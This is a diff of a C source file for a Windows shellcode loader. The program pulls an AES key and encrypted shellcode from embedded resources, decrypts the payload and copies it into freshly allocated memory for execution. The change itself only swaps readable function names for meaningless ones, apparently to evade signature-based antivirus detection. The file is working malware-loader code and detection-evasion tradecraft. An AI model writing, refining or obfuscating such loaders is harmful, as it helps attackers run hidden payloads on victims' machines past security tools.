@@ -5,7 +5,7 @@
 #pragma comment (lib, "user32.lib")
 
 // Function to load resource data into memory
-void coolredasload(const char* resName, unsigned char** data, DWORD* size) {
+void hshshlloo(const char* resName, unsigned char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
     HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
     
@@ -16,7 +16,7 @@ void coolredasload(const char* resName, unsigned char** data, DWORD* size) {
 }
 
 // Function to decrypt AES encrypted shellcode
-void DECaes(char* coolcode, DWORD coolcodeLen, char* key, DWORD keyLen) {
+void decssryam(char* coolcode, DWORD coolcodeLen, char* key, DWORD keyLen) {
     HCRYPTPROV hProv;
     HCRYPTHASH hHash;
     HCRYPTKEY hKey;
@@ -39,11 +39,11 @@ int main() {
 
     unsigned char* AESkey;
     DWORD AESkeyLen;
-    coolredasload("AESKEY", &AESkey, &AESkeyLen);  // Load AES key
+    hshshlloo("AESKEY", &AESkey, &AESkeyLen);  // Load AES key
 
     unsigned char* AESCode;
     DWORD AESCodeLen;
-    coolredasload("AESCODE", &AESCode, &AESCodeLen);  // Load AES shellcode
+    hshshlloo("AESCODE", &AESCode, &AESCodeLen);  // Load AES shellcode
 
     // Print the AES key and shellcode for debugging (as hex)
      unsigned char keykum[AESkeyLen];
@@ -58,7 +58,7 @@ int main() {
 
     LPVOID coollo = VirtualAllocExNuma(GetCurrentProcess(), NULL, AESCodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
 
-    DECaes((char*)codu, sizeof(codu), keykum, sizeof(keykum));  // Decrypt AES shellcode
+    decssryam((char*)codu, sizeof(codu), keykum, sizeof(keykum));  // Decrypt AES shellcode
 
     memcpy(coollo, codu, sizeof(codu));  
     DWORD oldProtect;
